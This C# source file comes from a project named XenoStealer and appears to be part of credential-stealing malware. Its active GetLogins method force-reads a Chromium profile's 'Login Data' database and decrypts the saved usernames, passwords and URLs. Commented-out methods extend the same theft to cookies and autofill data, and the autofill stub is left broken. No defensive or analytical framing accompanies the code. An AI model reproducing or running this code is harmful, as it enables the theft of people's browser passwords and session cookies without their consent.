using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class Chromium
    {

        public static DataExtractionStructs.ChromiumLogin[] GetLogins(string profilePath, ChromeDecryptor decryptor) 
        {
            List<DataExtractionStructs.ChromiumLogin> logins = new List<DataExtractionStructs.ChromiumLogin>();
        
            string db_location = Path.Combine(profilePath, "Login Data");
            if (!File.Exists(db_location))
            {
                return null;
            }
        
            byte[] fileBytes = Utils.ForceReadFile(db_location);
            if (fileBytes == null)
            {
                return null;
            }
        
            SqlLite3Parser parser;
            try
            {
                parser = new SqlLite3Parser(fileBytes);
            }
            catch
            {
                return null;
            }
        
            if (!parser.ReadTable("logins"))
            {
                return null;
            }
        
            for (int i = 0; i < parser.GetRowCount(); i++)
            {
                object password_obj = parser.GetValue(i, "password_value");
                object username_obj = parser.GetValue(i, "username_value");
                object url_obj = parser.GetValue(i, "action_url");

                if (password_obj.GetType() != typeof(byte[]) || username_obj.GetType() != typeof(string) || url_obj.GetType() != typeof(string)) 
                {
                    continue;
                }

                byte[] password_buffer = (byte[])password_obj;
                string username = (string)username_obj;
                string url = (string)url_obj;


                if (string.IsNullOrEmpty(url))
                {
                    object TempUrl_obj = parser.GetValue(i, "origin_url");
                    if (TempUrl_obj.GetType()!=typeof(string) && TempUrl_obj != null) 
                    {
                        url = (string)TempUrl_obj;
                    }
                }
                if (password_buffer == null || username == null || url == null) continue;
        
                string password = decryptor.Decrypt(password_buffer);
        
                if (string.IsNullOrEmpty(password))
                {
                    continue;
                }
                logins.Add(new DataExtractionStructs.ChromiumLogin(username, password, url));
            }
        
            return logins.ToArray();
        
        }
        //public static DataExtractionStructs.ChromiumCookie[] GetCookies(string profilePath, ChromeDecryptor decryptor) 
        //{
        //    List<DataExtractionStructs.ChromiumCookie> cookies = new List<DataExtractionStructs.ChromiumCookie>();
        //
        //    string db_location = Path.Combine(profilePath, "Network", "Cookies");
        //    if (!File.Exists(db_location))
        //    {
        //        return null;
        //    }
        //
        //    byte[] fileBytes = Utils.ForceReadFile(db_location);
        //    if (fileBytes == null)
        //    {
        //        return null;
        //    }
        //
        //    SqlLite3Parser parser;
        //    try
        //    {
        //        parser = new SqlLite3Parser(fileBytes);
        //    }
        //    catch
        //    {
        //        return null;
        //    }
        //
        //    if (!parser.ReadTable("cookies"))
        //    {
        //        return null;
        //    }
        //
        //    for (int i = 0; i < parser.GetRowCount(); i++)
        //    {
        //        string domain = parser.GetValue(i, "host_key");
        //        string name = parser.GetValue(i, "name");
        //        string path = parser.GetValue(i, "path");
        //        string encryptedCookie = parser.GetValue(i, "encrypted_value");
        //        string expiry_string = parser.GetValue(i, "expires_utc");
        //        bool secure = parser.GetValue(i, "is_secure") != "0";
        //        bool httpOnly = parser.GetValue(i, "is_httponly") != "0";
        //
        //        bool gotExpiry = ulong.TryParse(expiry_string, out ulong expiry);
        //
        //        if (domain == null || name == null || path == null || encryptedCookie == null || !gotExpiry) continue;
        //
        //        string decryptedCookie = decryptor.Decrypt(encryptedCookie);
        //        if (string.IsNullOrEmpty(decryptedCookie))
        //        {
        //            continue;
        //        }
        //        cookies.Add(new DataExtractionStructs.ChromiumCookie(domain, path, name, decryptedCookie, expiry, secure, httpOnly));
        //    }
        //
        //    return cookies.ToArray();
        //}
        //public static DataExtractionStructs.ChromiumAutoFill[] GetAutoFills(string profilePath) 
        //{
        //    List<DataExtractionStructs.ChromiumAutoFill> autofills = new List<DataExtractionStructs.ChromiumAutoFill>();
        //
        //    string db_location = Path.Combine(profilePath, "Web Data");
        //    if (!File.Exists(db_location))
        //    {
        //        return null;
        //    }
        //
        //    byte[] fileBytes = Utils.ForceReadFile(db_location);
        //    if (fileBytes == null)
        //    {
        //        return null;
        //    }
        //
        //    SqlLite3Parser parser;
        //    try
        //    {
        //        parser = new SqlLite3Parser(fileBytes);
        //    }
        //    catch
        //    {
        //        return null;
        //    }
        //
        //    if (!parser.ReadTable("cookies"))
        //    {
        //        return null;
        //    }
        //
        //    //for (int i = 0; i < parser.GetRowCount(); i++)
        //    //{
        //    //    string name = parser.GetValue(i, "name");
        //    //    string value = parser.GetValue(i, "path");
        //    //
        //    //    if (domain == null || name == null || path == null || encryptedCookie == null || !gotExpiry) continue;
        //    //
        //    //    if (string.IsNullOrEmpty(decryptedCookie))
        //    //    {
        //    //        continue;
        //    //    }
        //    //    autofills.Add(new DataExtractionStructs.ChromiumAutoFill());
        //    //}
        //
        //    return autofills.ToArray();
        //}

    }
}
